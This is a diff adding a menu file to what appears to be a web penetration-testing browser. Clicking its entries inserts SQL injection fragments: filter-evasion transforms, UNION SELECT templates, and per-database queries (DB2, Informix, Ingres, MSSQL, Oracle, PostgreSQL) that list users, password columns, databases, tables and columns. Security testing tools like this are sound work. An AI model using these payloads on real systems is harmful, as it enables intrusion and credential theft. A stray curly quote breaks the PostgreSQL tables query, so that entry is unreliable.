@@ -1,0 +1,89 @@
+<menu.popup id="injmenu">
+ <li>Filter Evasion
+  <menu>
+  <li onclick="quickinject:run(forge.sql_concat)">String to Quoted Strings</li>
+  <li onclick="Sandcat.reqbuildermenu:run(quickinject.spacestocommenttags)">Spaces To Comment Tags</li>
+  <li onclick="Sandcat.reqbuildermenu:run(quickinject.spacestonewlines)">Spaces To New Lines</li>
+  </menu>
+ </li>
+ <li>Insert UNION Statement
+   <menu>
+      <li onclick="reqbuilder.edit.insert(quickinject.getcolumns('UNION SELECT %s'))">UNION SELECT</li>
+      <li onclick="reqbuilder.edit.insert(quickinject.getcolumns('UNION ALL SELECT %s'))">UNION ALL SELECT</li>
+   </menu>
+ </li>
+ <hr/>
+ <li>DB2
+  <menu>
+  <li onclick="quickinject:run(forge.str_escape_oracle)">String Escape (CHR)</li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert('versionnumber, version_timestamp FROM sysibm.sysversions')">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('user FROM sysibm.sysdummy1')">Current User</li>
+  <li.databases onclick="reqbuilder.edit.insert('schemaname FROM syscat.schemata')">Databases</li>
+  <li.tables onclick="reqbuilder.edit.insert('name FROM sysibm.systables')">Tables</li>
+  <li.columns onclick="reqbuilder.edit.insert('name, tbname, coltype from sysibm.syscolumns')">Columns</li>
+  </menu>
+ </li>
+ <li>Informix
+  <menu>
+  <li.info onclick="reqbuilder.edit.insert([[DBINFO('version', 'full') FROM systables WHERE tabid = 1]])">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('USER FROM systables WHERE tabid = 1')">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert('username, usertype, password FROM sysusers')">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('name, owner from sysdatabases')">Databases</li>
+  <li.tables onclick="reqbuilder.edit.insert('tabname, owner FROM systables')">Tables</li>
+  <li.columns onclick="reqbuilder.edit.insert('tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid')">Columns</li>
+  </menu>
+ </li>
+ <li>Ingres
+  <menu>
+  <li.info onclick="reqbuilder.edit.insert([[dbmsinfo('_version')]])">Version</li>
+  <li.user onclick="reqbuilder.edit.insert([[dbmsinfo('session_user')]])">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert([[name, password FROM iiuser]])">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('name FROM iidatabase')">Databases</li>
+  <li.tables onclick="reqbuilder.edit.insert('table_name, table_owner from iitables')">Tables</li>
+  <li.columns onclick="reqbuilder.edit.insert('column_name, column_datatype, table_name, table_owner from iicolumns')">Columns</li>
+  </menu>
+ </li>
+ <li>MySQL
+  <menu>
+   <include src="Huntpad.scx#quickinject\toolbar_sqli_mysql.html"/>
+  </menu>
+ </li>
+ <li>MSSQL
+  <menu>
+  <li onclick="quickinject:run(forge.str_escape_mssql)">String Escape (CHAR)</li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert('@@version')">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('user_name()')">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert('name FROM master..syslogins')">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('name FROM master..sysdatabases')">Databases</li>
+  <li.columns onclick="reqbuilder.edit.insert([[name FROM syscolumns WHERE id = (SELECT id FROM sysobjects 
+WHERE name = 'tablename')]])">Columns</li>
+  <li.tables onclick="reqbuilder.edit.insert([[name FROM master..sysobjects WHERE xtype = 'U']])">Tables</li>
+  </menu>
+ </li>
+ <li>Oracle
+  <menu>
+  <li onclick="quickinject:run(forge.str_escape_oracle)">String Escape (CHR)</li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert([[banner FROM v$version WHERE banner LIKE 'Oracle%']])">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('user FROM dual')">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert('username FROM dba_users')">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('DISTINCT owner FROM all_tables')">Databases</li>
+  <li.columns onclick="reqbuilder.edit.insert([[column_name FROM all_tab_columns WHERE table_name = 'tablename']])">Columns</li>
+  <li.tables onclick="reqbuilder.edit.insert('table_name FROM all_tables')">Tables</li>
+  </menu>
+ </li>
+ <li>PostgreSQL
+  <menu>
+  <li onclick="quickinject:run(forge.str_escape_oracle)">String Escape (CHR)</li>
+  <hr/>
+  <li.info onclick="reqbuilder.edit.insert('version()')">Version</li>
+  <li.user onclick="reqbuilder.edit.insert('user')">Current User</li>
+  <li.users onclick="reqbuilder.edit.insert('usename FROM pg_user')">Users</li>
+  <li.databases onclick="reqbuilder.edit.insert('datname FROM pg_database')">Databases</li>
+  <li.columns onclick="reqbuilder.edit.insert([[relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')]])">Columns</li>
+  <li.tables onclick="reqbuilder.edit.insert([[c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r',”) AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)]])">Tables</li>
+  </menu>
+ </li>
+</menu>
